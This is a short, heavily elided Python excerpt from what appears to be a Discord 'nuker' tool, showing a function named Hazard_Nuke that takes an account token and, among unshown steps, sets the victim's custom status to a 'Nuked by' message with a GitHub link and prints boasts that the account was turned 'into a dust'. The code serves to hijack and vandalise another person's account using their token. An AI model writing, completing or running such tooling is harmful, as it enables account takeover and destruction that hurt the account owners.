...
def Hazard_Nuke(token, Server_Name, message_Content):
    setTitle("Deploying Carnage")
    print(f"{Fore.RESET}[{Fore.RED}*{Fore.RESET}] {Fore.BLUE}Carnage Deployed. . .")
    ...
    setting = {
          ...
          "custom_status": {"text": "Nuked by https://github.com/starlinkboy"},
          'status': "idle"
    }
    ...
    setTitle(f"Carnag has successfully Nuked the account!")
    SlowPrint(f"{Fore.GREEN}Succesfully turned {a} into a dust. ")
